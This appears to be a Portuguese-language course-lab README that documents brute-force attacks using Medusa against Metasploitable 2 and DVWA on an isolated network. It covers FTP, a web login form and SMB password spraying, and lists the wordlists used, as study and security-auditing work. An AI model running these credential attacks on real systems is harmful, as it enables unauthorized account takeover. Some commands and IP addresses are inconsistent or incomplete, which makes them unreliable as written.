# 🛡️ Projeto: Testes de Força Bruta com Kali Linux, Medusa e Metasploitable 2

Este projeto demonstra a execução de ataques de força bruta em um ambiente **controlado de laboratório**, utilizando **Kali Linux**, **Medusa**, **Metasploitable 2** e aplicações vulneráveis como **DVWA**.  
O objetivo é aprender, testar e documentar técnicas ofensivas, bem como entender medidas reais de mitigação.  

---
# 📘 Sobre o Projeto

Este laboratório faz parte de um desafio da DIO, focado em:

✔ Executar ataques de força bruta em diferentes serviços  
✔ Compreender vulnerabilidades comuns  
✔ Documentar o processo técnico  
✔ Utilizar o Medusa para auditoria de segurança  
✔ Compartilhar evidências e aprendizado no GitHub  

Todo o ambiente foi configurado localmente no VirtualBox, em uma rede isolada, garantindo total segurança.

---
# 🏗 Arquitetura do Ambiente

| Máquina | Sistema | Papel | IP |
|--------|---------|-------|----|
| Kali Linux | Kali 2025.3 | Atacante | 192.168.56.X |
| Metasploitable 2 | Ubuntu Vulnerable | Alvo | 192.168.56.X |

Rede utilizada:

----
# Ataque 1 — Força Bruta FTP com Medusa
nmap -p 192.168.18.59

executando ataque: medusa -h 192.168.18.59 -u msfadmin -P wordlist.txt -M ftp

Resultado esperado: ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin

----
# Ataque 2 — Força Bruta em Formulário Web (DVWA)
DVWA acessado via: http://192.168.18.59/DVWA

Login padrão DVWA:
user: admin
pass: password

Configurar DVWA → Security Level: LOW
Comando do Medusa:
medusa -h 192.168.56.101 -u admin -P wordlist.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY:"Login failed" \
  -m SUCCESS:"Welcome" \
  -m USER:"username" \
  -m PASS:"password"

  -----
  # Ataque 3 — Password Spraying em SMB
  Verificar SMB:
nmap -p 445 192.168.56.101

Lista de usuários (users.txt):
msfadmin
user
karen
nobody
service

Executando password spraying:
medusa -h 192.168.56.101 -U users.txt -p msfadmin -M smbnt

---
📂 Wordlists Utilizadas
wordlist.txt
123456
msfadmin
password
admin
toor

users.txt
msfadmin
user
karen
nobody
service
